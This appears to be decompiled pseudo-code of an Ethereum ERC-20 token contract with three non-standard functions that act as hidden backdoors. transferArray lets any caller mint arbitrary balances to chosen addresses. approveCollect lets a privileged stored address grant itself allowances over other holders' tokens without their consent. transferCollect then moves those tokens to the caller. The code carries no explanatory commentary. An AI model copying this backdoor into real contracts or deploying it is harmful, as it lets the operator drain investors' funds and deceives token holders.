contract main {




// =====================  Runtime code  =====================


array of uint256 name;
array of uint256 symbol;
uint8 decimals;
uint256 totalSupply;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
address stor6;

function name() {
    return name[0 len name.length]
}

function totalSupply() {
    return totalSupply
}

function decimals() {
    return decimals
}

function balanceOf(address arg1) {
    return balanceOf[arg1]
}

function symbol() {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) {
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function approve(address arg1, uint256 arg2) {
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function transfer(address arg1, uint256 arg2) {
    require arg1
    require balanceOf[address(msg.sender)] >= arg2
    require balanceOf[address(arg1)] + arg2 >= balanceOf[address(arg1)]
    balanceOf[address(msg.sender)] -= arg2
    balanceOf[address(arg1)] += arg2
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    require arg2
    require arg1
    require balanceOf[address(arg1)] >= arg3
    require allowance[address(arg1)][address(msg.sender)] >= arg3
    require balanceOf[address(arg2)] + arg3 >= balanceOf[address(arg2)]
    allowance[address(arg1)][address(msg.sender)] -= arg3
    balanceOf[address(arg1)] -= arg3
    balanceOf[address(arg2)] += arg3
    emit Transfer(arg3, arg1, arg2);
    return 1
}

function transferArray(address[] arg1, uint256 arg2) {
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    idx = 0
    while idx < arg1.length:
        require idx < arg1.length
        mem[0] = mem[(32 * idx) + 140 len 20]
        mem[32] = 4
        balanceOf[mem[(32 * idx) + 140 len 20]] += arg2
        require idx < arg1.length
        _15 = mem[(32 * idx) + 128]
        mem[(32 * arg1.length) + 128] = arg2
        emit Transfer(arg2, msg.sender, address(_15));
        idx = idx + 1
        continue 
}

function approveCollect(address[] arg1, uint256 arg2) {
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    require msg.sender == stor6
    idx = 0
    while idx < arg1.length:
        require idx < arg1.length
        mem[0] = msg.sender
        mem[32] = sha3(mem[(32 * idx) + 140 len 20], 5)
        allowance[mem[(32 * idx) + 140 len 20]][address(msg.sender)] = arg2
        require idx < arg1.length
        _21 = mem[(32 * idx) + 128]
        mem[(32 * arg1.length) + 128] = arg2
        emit Approval(arg2, address(_21), msg.sender);
        idx = idx + 1
        continue 
    return 1
}

function transferCollect(address[] arg1, uint256 arg2) payable {
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    idx = 0
    while idx < arg1.length:
        require idx < arg1.length
        _18 = mem[(32 * idx) + 128]
        require msg.sender
        require mem[(32 * idx) + 140 len 20]
        require balanceOf[mem[(32 * idx) + 140 len 20]] >= arg2
        require allowance[address(mem[(32 * idx) + 128])][address(msg.sender)] >= arg2
        require balanceOf[address(msg.sender)] + arg2 >= balanceOf[address(msg.sender)]
        allowance[address(mem[(32 * idx) + 128])][address(msg.sender)] -= arg2
        balanceOf[address(mem[(32 * idx) + 128])] -= arg2
        mem[0] = msg.sender
        mem[32] = 4
        balanceOf[address(msg.sender)] += arg2
        mem[(32 * arg1.length) + 128] = arg2
        emit Transfer(arg2, address(_18), msg.sender);
        idx = idx + 1
        continue 
}



}
